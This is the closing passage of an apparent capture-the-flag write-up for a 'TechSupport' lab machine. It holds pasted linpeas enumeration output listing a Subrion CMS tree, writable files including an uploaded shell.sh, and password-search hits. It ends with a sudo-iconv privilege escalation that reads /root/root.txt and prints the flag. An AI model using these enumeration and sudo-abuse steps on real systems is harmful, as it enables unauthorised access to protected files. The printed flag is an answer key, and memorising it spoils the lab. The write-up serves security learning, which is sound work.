/var/www/html/subrion/admin/templates/default/image-types.tpl
/var/www/html/subrion/admin/templates/default/img
/var/www/html/subrion/admin/templates/default/img/ico
/var/www/html/subrion/admin/templates/default/img/ico/favicon.ico
/var/www/html/subrion/admin/templates/default/index.tpl
/var/www/html/subrion/admin/templates/default/invoice-view.tpl
/var/www/html/subrion/admin/templates/default/invoices.tpl
/var/www/html/subrion/admin/templates/default/js
/var/www/html/subrion/admin/templates/default/js/app.js
/var/www/html/subrion/admin/templates/default/js/bootstrap.min.js
/var/www/html/subrion/admin/templates/default/js/enquire.min.js
/var/www/html/subrion/admin/templates/default/languages.tpl
/var/www/html/subrion/admin/templates/default/layout.tpl
/var/www/html/subrion/admin/templates/default/less
/var/www/html/subrion/admin/templates/default/less/base-calmy.less
/var/www/html/subrion/admin/templates/default/less/base-darkness.less
/var/www/html/subrion/admin/templates/default/less/base-default.less
/var/www/html/subrion/admin/templates/default/less/base-gebeus-waterfall.less
/var/www/html/subrion/admin/templates/default/less/base-radiant-orchid.less
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/admin/templates/default/less/bootstrap/alerts.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/badges.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/breadcrumbs.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/button-groups.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/buttons.less
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/admin/templates/default/less/bootstrap/mixins/alerts.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/mixins/background-variant.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/mixins/border-radius.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/mixins/buttons.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/mixins/center-block.less
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/admin/templates/default/less/bootstrap/modals.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/navbar.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/navs.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/normalize.less
/var/www/html/subrion/admin/templates/default/less/bootstrap/pager.less
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/admin/templates/default/less/components
/var/www/html/subrion/admin/templates/default/less/components-theme.less
/var/www/html/subrion/admin/templates/default/less/components/blocks.less
/var/www/html/subrion/admin/templates/default/less/components/cards.less
/var/www/html/subrion/admin/templates/default/less/components/chips.less
/var/www/html/subrion/admin/templates/default/less/components/dropzone.less
/var/www/html/subrion/admin/templates/default/less/components/filter-toolbar.less
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/admin/templates/default/less/ext-override.less
/var/www/html/subrion/admin/templates/default/less/ia-bootstrap.less
/var/www/html/subrion/admin/templates/default/less/layout
/var/www/html/subrion/admin/templates/default/less/layout/content.less
/var/www/html/subrion/admin/templates/default/less/layout/layout.less
/var/www/html/subrion/admin/templates/default/less/layout/nav.less
/var/www/html/subrion/admin/templates/default/less/layout/nav.submenu.less
/var/www/html/subrion/admin/templates/default/less/layout/topbar.less
/var/www/html/subrion/admin/templates/default/less/pages
/var/www/html/subrion/admin/templates/default/less/pages/page.login.less
/var/www/html/subrion/admin/templates/default/less/pages/page.permissions.less
/var/www/html/subrion/admin/templates/default/less/pages/page.plans.less
/var/www/html/subrion/admin/templates/default/less/utils.less
/var/www/html/subrion/admin/templates/default/less/vars-calmy.less
/var/www/html/subrion/admin/templates/default/less/vars-darkness.less
/var/www/html/subrion/admin/templates/default/less/vars-default.less
/var/www/html/subrion/admin/templates/default/less/vars-gebeus-waterfall.less
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/admin/templates/default/less/vendor/bootstrap-switch.less
/var/www/html/subrion/admin/templates/default/less/vendor/font-subrion.less
/var/www/html/subrion/admin/templates/default/less/vendor/fontawesome
/var/www/html/subrion/admin/templates/default/less/vendor/fontawesome/animated.less
/var/www/html/subrion/admin/templates/default/less/vendor/fontawesome/bordered-pulled.less
/var/www/html/subrion/admin/templates/default/less/vendor/fontawesome/core.less
/var/www/html/subrion/admin/templates/default/less/vendor/fontawesome/fixed-width.less
/var/www/html/subrion/admin/templates/default/less/vendor/fontawesome/font-awesome.less
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/admin/templates/default/login.tpl
/var/www/html/subrion/admin/templates/default/members.tpl
/var/www/html/subrion/admin/templates/default/menu.tpl
/var/www/html/subrion/admin/templates/default/menus.tpl
/var/www/html/subrion/admin/templates/default/modules.tpl
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/admin/templates/emails
/var/www/html/subrion/admin/templates/emails/.babelrc
/var/www/html/subrion/admin/templates/emails/.gitignore
/var/www/html/subrion/admin/templates/emails/LICENSE
/var/www/html/subrion/admin/templates/emails/README.md
/var/www/html/subrion/admin/templates/emails/dist
/var/www/html/subrion/admin/templates/emails/dist/assets
/var/www/html/subrion/admin/templates/emails/dist/assets/img
/var/www/html/subrion/admin/templates/emails/dist/css
/var/www/html/subrion/admin/templates/emails/dist/css/app.css
/var/www/html/subrion/admin/templates/emails/dist/email.index.html
/var/www/html/subrion/admin/templates/emails/dist/email.invoice_created.html
/var/www/html/subrion/admin/templates/emails/dist/email.layout.html
/var/www/html/subrion/admin/templates/emails/dist/email.member_approved.html
/var/www/html/subrion/admin/templates/emails/dist/email.member_disapproved.html
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/admin/templates/emails/example.config.json
/var/www/html/subrion/admin/templates/emails/gulpfile.babel.js
/var/www/html/subrion/admin/templates/emails/package.json
/var/www/html/subrion/admin/templates/emails/src
/var/www/html/subrion/admin/templates/emails/src/assets
/var/www/html/subrion/admin/templates/emails/src/assets/img
/var/www/html/subrion/admin/templates/emails/src/assets/img/.gitkeep
/var/www/html/subrion/admin/templates/emails/src/assets/scss
/var/www/html/subrion/admin/templates/emails/src/assets/scss/_settings.scss
/var/www/html/subrion/admin/templates/emails/src/assets/scss/app.scss
/var/www/html/subrion/admin/templates/emails/src/helpers
/var/www/html/subrion/admin/templates/emails/src/helpers/raw.js
/var/www/html/subrion/admin/templates/emails/src/layouts
/var/www/html/subrion/admin/templates/emails/src/layouts/default.html
/var/www/html/subrion/admin/templates/emails/src/pages
/var/www/html/subrion/admin/templates/emails/src/pages/email.index.html
/var/www/html/subrion/admin/templates/emails/src/pages/email.invoice_created.html
/var/www/html/subrion/admin/templates/emails/src/pages/email.layout.html
/var/www/html/subrion/admin/templates/emails/src/pages/email.member_approved.html
/var/www/html/subrion/admin/templates/emails/src/pages/email.member_disapproved.html
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/admin/templates/emails/src/partials
/var/www/html/subrion/admin/templates/emails/src/partials/.gitkeep
/var/www/html/subrion/admin/transactions.php
/var/www/html/subrion/admin/uploads.php
/var/www/html/subrion/admin/usergroups.php
/var/www/html/subrion/admin/visual.php
/var/www/html/subrion/backup
/var/www/html/subrion/backup/.htaccess
/var/www/html/subrion/changelog.txt
/var/www/html/subrion/composer.json
/var/www/html/subrion/favicon.ico
/var/www/html/subrion/front
/var/www/html/subrion/front/actions.php
/var/www/html/subrion/front/api.php
/var/www/html/subrion/front/captcha.php
/var/www/html/subrion/front/cron.php
/var/www/html/subrion/front/favorites.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/includes
/var/www/html/subrion/includes/OAuth2
/var/www/html/subrion/includes/OAuth2/Autoloader.php
/var/www/html/subrion/includes/OAuth2/ClientAssertionType
/var/www/html/subrion/includes/OAuth2/ClientAssertionType/ClientAssertionTypeInterface.php
/var/www/html/subrion/includes/OAuth2/ClientAssertionType/HttpBasic.php
/var/www/html/subrion/includes/OAuth2/Controller
/var/www/html/subrion/includes/OAuth2/Controller/AuthorizeController.php
/var/www/html/subrion/includes/OAuth2/Controller/AuthorizeControllerInterface.php
/var/www/html/subrion/includes/OAuth2/Controller/ResourceController.php
/var/www/html/subrion/includes/OAuth2/Controller/ResourceControllerInterface.php
/var/www/html/subrion/includes/OAuth2/Controller/TokenController.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/includes/OAuth2/Encryption
/var/www/html/subrion/includes/OAuth2/Encryption/EncryptionInterface.php
/var/www/html/subrion/includes/OAuth2/Encryption/FirebaseJwt.php
/var/www/html/subrion/includes/OAuth2/Encryption/Jwt.php
/var/www/html/subrion/includes/OAuth2/GrantType
/var/www/html/subrion/includes/OAuth2/GrantType/AuthorizationCode.php
/var/www/html/subrion/includes/OAuth2/GrantType/ClientCredentials.php
/var/www/html/subrion/includes/OAuth2/GrantType/GrantTypeInterface.php
/var/www/html/subrion/includes/OAuth2/GrantType/JwtBearer.php
/var/www/html/subrion/includes/OAuth2/GrantType/RefreshToken.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/includes/OAuth2/OpenID
/var/www/html/subrion/includes/OAuth2/OpenID/Controller
/var/www/html/subrion/includes/OAuth2/OpenID/Controller/AuthorizeController.php
/var/www/html/subrion/includes/OAuth2/OpenID/Controller/AuthorizeControllerInterface.php
/var/www/html/subrion/includes/OAuth2/OpenID/Controller/UserInfoController.php
/var/www/html/subrion/includes/OAuth2/OpenID/Controller/UserInfoControllerInterface.php
/var/www/html/subrion/includes/OAuth2/OpenID/GrantType
/var/www/html/subrion/includes/OAuth2/OpenID/GrantType/AuthorizationCode.php
/var/www/html/subrion/includes/OAuth2/OpenID/ResponseType
/var/www/html/subrion/includes/OAuth2/OpenID/ResponseType/AuthorizationCode.php
/var/www/html/subrion/includes/OAuth2/OpenID/ResponseType/AuthorizationCodeInterface.php
/var/www/html/subrion/includes/OAuth2/OpenID/ResponseType/CodeIdToken.php
/var/www/html/subrion/includes/OAuth2/OpenID/ResponseType/CodeIdTokenInterface.php
/var/www/html/subrion/includes/OAuth2/OpenID/ResponseType/IdToken.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/includes/OAuth2/OpenID/Storage
/var/www/html/subrion/includes/OAuth2/OpenID/Storage/AuthorizationCodeInterface.php
/var/www/html/subrion/includes/OAuth2/OpenID/Storage/UserClaimsInterface.php
/var/www/html/subrion/includes/OAuth2/Request.php
/var/www/html/subrion/includes/OAuth2/RequestInterface.php
/var/www/html/subrion/includes/OAuth2/Response.php
/var/www/html/subrion/includes/OAuth2/ResponseInterface.php
/var/www/html/subrion/includes/OAuth2/ResponseType
/var/www/html/subrion/includes/OAuth2/ResponseType/AccessToken.php
/var/www/html/subrion/includes/OAuth2/ResponseType/AccessTokenInterface.php
/var/www/html/subrion/includes/OAuth2/ResponseType/AuthorizationCode.php
/var/www/html/subrion/includes/OAuth2/ResponseType/AuthorizationCodeInterface.php
/var/www/html/subrion/includes/OAuth2/ResponseType/JwtAccessToken.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/includes/OAuth2/Scope.php
/var/www/html/subrion/includes/OAuth2/ScopeInterface.php
/var/www/html/subrion/includes/OAuth2/Server.php
/var/www/html/subrion/includes/OAuth2/Storage
/var/www/html/subrion/includes/OAuth2/Storage/AccessTokenInterface.php
/var/www/html/subrion/includes/OAuth2/Storage/AuthorizationCodeInterface.php
/var/www/html/subrion/includes/OAuth2/Storage/Cassandra.php
/var/www/html/subrion/includes/OAuth2/Storage/ClientCredentialsInterface.php
/var/www/html/subrion/includes/OAuth2/Storage/ClientInterface.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/includes/OAuth2/TokenType
/var/www/html/subrion/includes/OAuth2/TokenType/Bearer.php
/var/www/html/subrion/includes/OAuth2/TokenType/Mac.php
/var/www/html/subrion/includes/OAuth2/TokenType/TokenTypeInterface.php
/var/www/html/subrion/includes/PHPImageWorkshop
/var/www/html/subrion/includes/PHPImageWorkshop/Core
/var/www/html/subrion/includes/PHPImageWorkshop/Core/Exception
/var/www/html/subrion/includes/PHPImageWorkshop/Core/Exception/ImageWorkshopLayerException.php
/var/www/html/subrion/includes/PHPImageWorkshop/Core/Exception/ImageWorkshopLibException.php
/var/www/html/subrion/includes/PHPImageWorkshop/Core/GifCreator.php
/var/www/html/subrion/includes/PHPImageWorkshop/Core/GifFrameExtractor.php
/var/www/html/subrion/includes/PHPImageWorkshop/Core/ImageWorkshopLayer.php
/var/www/html/subrion/includes/PHPImageWorkshop/Core/ImageWorkshopLib.php
/var/www/html/subrion/includes/PHPImageWorkshop/Exception
/var/www/html/subrion/includes/PHPImageWorkshop/Exception/ImageWorkshopBaseException.php
/var/www/html/subrion/includes/PHPImageWorkshop/Exception/ImageWorkshopException.php
/var/www/html/subrion/includes/PHPImageWorkshop/Exif
/var/www/html/subrion/includes/PHPImageWorkshop/Exif/ExifOrientations.php
/var/www/html/subrion/includes/PHPImageWorkshop/Fonts
/var/www/html/subrion/includes/PHPImageWorkshop/Fonts/Arial.ttf
/var/www/html/subrion/includes/PHPImageWorkshop/ImageWorkshop.php
/var/www/html/subrion/includes/adminer
/var/www/html/subrion/includes/adminer/adminer.css
/var/www/html/subrion/includes/adminer/adminer.js
/var/www/html/subrion/includes/adminer/adminer.script.inc
/var/www/html/subrion/includes/api
/var/www/html/subrion/includes/api/auth.php
/var/www/html/subrion/includes/api/entity
/var/www/html/subrion/includes/api/entity/abstract.php
/var/www/html/subrion/includes/api/entity/field.php
/var/www/html/subrion/includes/api/entity/member.php
/var/www/html/subrion/includes/api/entity/migration.php
/var/www/html/subrion/includes/api/entity/phrase.php
/var/www/html/subrion/includes/api/push.php
/var/www/html/subrion/includes/api/renderer
/var/www/html/subrion/includes/api/renderer/abstract.php
/var/www/html/subrion/includes/api/renderer/interface.php
/var/www/html/subrion/includes/api/renderer/json.php
/var/www/html/subrion/includes/api/renderer/raw.php
/var/www/html/subrion/includes/api/request.php
/var/www/html/subrion/includes/api/response.php
/var/www/html/subrion/includes/api/storage.php
/var/www/html/subrion/includes/classes
/var/www/html/subrion/includes/classes/ia.admin.block.php
/var/www/html/subrion/includes/classes/ia.admin.dbcontrol.php
/var/www/html/subrion/includes/classes/ia.admin.module.php
/var/www/html/subrion/includes/classes/ia.admin.page.php
/var/www/html/subrion/includes/classes/ia.admin.sitemap.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/includes/config.inc.php
/var/www/html/subrion/includes/cron
/var/www/html/subrion/includes/cron/cleanup.php
/var/www/html/subrion/includes/cron/featured-expiration.php
/var/www/html/subrion/includes/cron/sitemap.php
/var/www/html/subrion/includes/cron/sponsored-expiration.php
/var/www/html/subrion/includes/elfinder
/var/www/html/subrion/includes/elfinder/Changelog
/var/www/html/subrion/includes/elfinder/LICENSE.md
/var/www/html/subrion/includes/elfinder/README.md
/var/www/html/subrion/includes/elfinder/css
/var/www/html/subrion/includes/elfinder/css/elfinder.full.css
/var/www/html/subrion/includes/elfinder/css/elfinder.min.css
/var/www/html/subrion/includes/elfinder/css/theme.css
/var/www/html/subrion/includes/elfinder/elfinder.html
/var/www/html/subrion/includes/elfinder/img
/var/www/html/subrion/includes/elfinder/js
/var/www/html/subrion/includes/elfinder/js/elfinder.full.js
/var/www/html/subrion/includes/elfinder/js/elfinder.min.js
/var/www/html/subrion/includes/elfinder/js/extras
/var/www/html/subrion/includes/elfinder/js/extras/editors.default.js
/var/www/html/subrion/includes/elfinder/js/extras/editors.default.min.js
/var/www/html/subrion/includes/elfinder/js/extras/encoding-japanese.min.js
/var/www/html/subrion/includes/elfinder/js/extras/quicklook.googledocs.js
/var/www/html/subrion/includes/elfinder/js/extras/quicklook.googledocs.min.js
/var/www/html/subrion/includes/elfinder/js/i18n
/var/www/html/subrion/includes/elfinder/js/i18n/elfinder.LANG.js
/var/www/html/subrion/includes/elfinder/js/i18n/elfinder.ar.js
/var/www/html/subrion/includes/elfinder/js/i18n/elfinder.bg.js
/var/www/html/subrion/includes/elfinder/js/i18n/elfinder.ca.js
/var/www/html/subrion/includes/elfinder/js/i18n/elfinder.cs.js
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/includes/elfinder/js/i18n/help/cs.html.js
/var/www/html/subrion/includes/elfinder/js/i18n/help/en.html
/var/www/html/subrion/includes/elfinder/js/i18n/help/en.html.js
/var/www/html/subrion/includes/elfinder/js/i18n/help/ja.html.js
/var/www/html/subrion/includes/elfinder/js/i18n/help/jp.html
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/includes/elfinder/js/proxy
/var/www/html/subrion/includes/elfinder/js/proxy/elFinderSupportVer1.js
/var/www/html/subrion/includes/elfinder/php
/var/www/html/subrion/includes/elfinder/php/.tmp
/var/www/html/subrion/includes/elfinder/php/.tmp/.htaccess
/var/www/html/subrion/includes/elfinder/php/MySQLStorage.sql
/var/www/html/subrion/includes/elfinder/php/autoload.php
/var/www/html/subrion/includes/elfinder/php/connector.minimal.php-dist
/var/www/html/subrion/includes/elfinder/php/connector.php-dist
/var/www/html/subrion/includes/elfinder/php/editors
/var/www/html/subrion/includes/elfinder/php/editors/ZohoOffice
/var/www/html/subrion/includes/elfinder/php/editors/ZohoOffice/editor.php
/var/www/html/subrion/includes/elfinder/php/editors/editor.php
/var/www/html/subrion/includes/elfinder/php/elFinder.class.php
/var/www/html/subrion/includes/elfinder/php/elFinderConnector.class.php
/var/www/html/subrion/includes/elfinder/php/elFinderFlysystemGoogleDriveNetmount.php
/var/www/html/subrion/includes/elfinder/php/elFinderPlugin.php
/var/www/html/subrion/includes/elfinder/php/elFinderSession.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/includes/elfinder/php/libs/GdBmp.php
/var/www/html/subrion/includes/elfinder/php/mime.types
/var/www/html/subrion/includes/elfinder/php/plugins
/var/www/html/subrion/includes/elfinder/php/plugins/AutoResize
/var/www/html/subrion/includes/elfinder/php/plugins/AutoResize/plugin.php
/var/www/html/subrion/includes/elfinder/php/plugins/AutoRotate
/var/www/html/subrion/includes/elfinder/php/plugins/AutoRotate/plugin.php
/var/www/html/subrion/includes/elfinder/php/plugins/Normalizer
/var/www/html/subrion/includes/elfinder/php/plugins/Normalizer/plugin.php
/var/www/html/subrion/includes/elfinder/php/plugins/Sanitizer
/var/www/html/subrion/includes/elfinder/php/plugins/Sanitizer/plugin.php
/var/www/html/subrion/includes/elfinder/php/plugins/Watermark
/var/www/html/subrion/includes/elfinder/php/plugins/Watermark/plugin.php
/var/www/html/subrion/includes/elfinder/php/resources
/var/www/html/subrion/includes/elfinder/sounds
/var/www/html/subrion/includes/function.php
/var/www/html/subrion/includes/helpers
/var/www/html/subrion/includes/helpers/ia.category.flat.php
/var/www/html/subrion/includes/helpers/ia.category.front.flat.php
/var/www/html/subrion/includes/helpers/ia.category.interface.php
/var/www/html/subrion/includes/htmlpurifier
/var/www/html/subrion/includes/htmlpurifier/HTMLPurifier
/var/www/html/subrion/includes/htmlpurifier/HTMLPurifier.auto.php
/var/www/html/subrion/includes/htmlpurifier/HTMLPurifier.autoload.php
/var/www/html/subrion/includes/htmlpurifier/HTMLPurifier.composer.php
/var/www/html/subrion/includes/htmlpurifier/HTMLPurifier.func.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/includes/htmlpurifier/HTMLPurifier/Arborize.php
/var/www/html/subrion/includes/htmlpurifier/HTMLPurifier/AttrCollections.php
/var/www/html/subrion/includes/htmlpurifier/HTMLPurifier/AttrDef
/var/www/html/subrion/includes/htmlpurifier/HTMLPurifier/AttrDef.php
/var/www/html/subrion/includes/htmlpurifier/HTMLPurifier/AttrDef/CSS
/var/www/html/subrion/includes/htmlpurifier/HTMLPurifier/AttrDef/CSS.php
/var/www/html/subrion/includes/htmlpurifier/HTMLPurifier/AttrDef/CSS/AlphaValue.php
/var/www/html/subrion/includes/htmlpurifier/HTMLPurifier/AttrDef/CSS/Background.php
/var/www/html/subrion/includes/htmlpurifier/HTMLPurifier/AttrDef/CSS/BackgroundPosition.php
/var/www/html/subrion/includes/htmlpurifier/HTMLPurifier/AttrDef/CSS/Border.php
/var/www/html/subrion/includes/htmlpurifier/HTMLPurifier/AttrDef/CSS/Color.php
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/subrion/includes/htmlpurifier/HTMLPurifier/AttrDef/Clone.php

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Interesting GROUP writable files (not in Home) (max 500)
\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group www-data:
/var/www/html/subrion/uploads/.tmb
/var/www/html/subrion/uploads/shell.sh
/var/www/html/subrion/uploads/linpeas.sh

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Searching passwords in history files

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Searching passwords in config PHP files
        $member = $this->_iaDb->row(['password'], iaDb::convertIds($client_id, 'username'), $iaUsers::getTable());
        return ($member && $member['password'] == $iaUsers->encodePassword($client_secret));
    const TYPE_PASSWORD = 'password';
define('INTELLI_DBUSER', 'subrionuser');
		$pwd    = trim( wp_unslash( $_POST['pwd'] ) );

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/python2.7/dist-packages/samba/credentials.so
/usr/lib/python2.7/dist-packages/samba/tests/credentials.py
/usr/lib/python2.7/dist-packages/samba/tests/credentials.pyc
/usr/lib/x86_64-linux-gnu/libsamba-credentials.so.0
/usr/lib/x86_64-linux-gnu/libsamba-credentials.so.0.0.1
/usr/lib/x86_64-linux-gnu/samba/ldb/local_password.so
/usr/lib/x86_64-linux-gnu/samba/ldb/password_hash.so
/usr/lib/x86_64-linux-gnu/samba/libcmdline-credentials.so.0
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/locale-langpack/en_AU/LC_MESSAGES/ubuntuone-credentials.mo
/usr/share/locale-langpack/en_GB/LC_MESSAGES/ubuntuone-credentials.mo
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-store.1.gz
/usr/share/man/man1/git-credential.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password
/var/www/html/subrion/admin/templates/emails/dist/email.password_changement.html
/var/www/html/subrion/admin/templates/emails/dist/email.password_restoration.html
/var/www/html/subrion/admin/templates/emails/src/pages/email.password_changement.html
/var/www/html/subrion/admin/templates/emails/src/pages/email.password_restoration.html
/var/www/html/wordpress/wp-admin/includes/class-wp-application-passwords-list-table.php
/var/www/html/wordpress/wp-admin/js/application-passwords.js
/var/www/html/wordpress/wp-admin/js/application-passwords.min.js
/var/www/html/wordpress/wp-admin/js/password-strength-meter.js
/var/www/html/wordpress/wp-admin/js/password-strength-meter.min.js
  #)There are more creds/passwds files in the previous parent folder

/var/www/html/wordpress/wp-includes/rest-api/endpoints/class-wp-rest-application-passwords-controller.php

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Checking for TTY (sudo/su) passwords in audit logs

\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Searching passwords inside logs (limit 70)
 base-passwd depends on libc6 (>= 2.8); however:
 base-passwd depends on libdebconfclient0 (>= 0.145); however:
2020-08-10 18:14:40 configure base-passwd:amd64 3.5.39 3.5.39
2020-08-10 18:14:40 install base-passwd:amd64 <none> 3.5.39
2020-08-10 18:14:40 status half-configured base-passwd:amd64 3.5.39
2020-08-10 18:14:40 status half-installed base-passwd:amd64 3.5.39
2020-08-10 18:14:40 status installed base-passwd:amd64 3.5.39
2020-08-10 18:14:40 status unpacked base-passwd:amd64 3.5.39
2020-08-10 18:14:45 status half-configured base-passwd:amd64 3.5.39
2020-08-10 18:14:45 status half-installed base-passwd:amd64 3.5.39
2020-08-10 18:14:45 status unpacked base-passwd:amd64 3.5.39
2020-08-10 18:14:45 upgrade base-passwd:amd64 3.5.39 3.5.39
2020-08-10 18:14:55 install passwd:amd64 <none> 1:4.2-3.1ubuntu5
2020-08-10 18:14:55 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
2020-08-10 18:14:56 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
2020-08-10 18:15:02 configure base-passwd:amd64 3.5.39 <none>
2020-08-10 18:15:02 status half-configured base-passwd:amd64 3.5.39
2020-08-10 18:15:02 status installed base-passwd:amd64 3.5.39
2020-08-10 18:15:02 status unpacked base-passwd:amd64 3.5.39
2020-08-10 18:15:12 configure passwd:amd64 1:4.2-3.1ubuntu5 <none>
2020-08-10 18:15:12 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
2020-08-10 18:15:12 status installed passwd:amd64 1:4.2-3.1ubuntu5
2020-08-10 18:15:12 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
2020-08-10 18:16:22 configure passwd:amd64 1:4.2-3.1ubuntu5.4 <none>
2020-08-10 18:16:22 status half-configured passwd:amd64 1:4.2-3.1ubuntu5
2020-08-10 18:16:22 status half-configured passwd:amd64 1:4.2-3.1ubuntu5.4
2020-08-10 18:16:22 status half-installed passwd:amd64 1:4.2-3.1ubuntu5
2020-08-10 18:16:22 status installed passwd:amd64 1:4.2-3.1ubuntu5.4
2020-08-10 18:16:22 status unpacked passwd:amd64 1:4.2-3.1ubuntu5
2020-08-10 18:16:22 status unpacked passwd:amd64 1:4.2-3.1ubuntu5.4
2020-08-10 18:16:22 upgrade passwd:amd64 1:4.2-3.1ubuntu5 1:4.2-3.1ubuntu5.4
Description: Set up users and passwords
Preparing to unpack .../base-passwd_3.5.39_amd64.deb ...
Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5_amd64.deb ...
Selecting previously unselected package base-passwd.
Selecting previously unselected package passwd.
Setting up base-passwd (3.5.39) ...
Setting up passwd (1:4.2-3.1ubuntu5) ...
Shadow passwords are now on.
Unpacking base-passwd (3.5.39) ...
Unpacking base-passwd (3.5.39) over (3.5.39) ...
Unpacking passwd (1:4.2-3.1ubuntu5) ...
dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
```

11. Use `sudo -l` to find that we can run `iconv` as root
```
scamsite@TechSupport:~$ sudo -l
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```

12. [GTFObins](https://gtfobins.github.io/gtfobins/iconv/) shows that we can use `iconv` to read restricted files. Use `sudo -u root /usr/bin/iconv -f 8859_1 -t 8859_1 /root/root.txt` to get the flag `851b8233a8c09400ec30651bd1529bf1ed02790b`
